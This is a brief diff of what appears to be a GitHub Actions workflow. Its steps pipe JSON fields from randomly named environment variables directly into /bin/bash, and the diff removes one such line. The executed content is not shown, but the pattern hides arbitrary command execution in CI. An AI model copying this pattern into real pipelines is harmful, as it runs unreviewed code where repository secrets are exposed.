@@ -28,7 +28,6 @@ jobs:
           echo $tusy430 | jq -r .bwm3 | /bin/bash
           echo $wb1772 | jq -r .phjs8706 | /bin/bash
           echo $mxelv51691 | jq -r .jraqg62350 | /bin/bash
-          printf '%s' "$etv580" | jq -r .oxs37 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
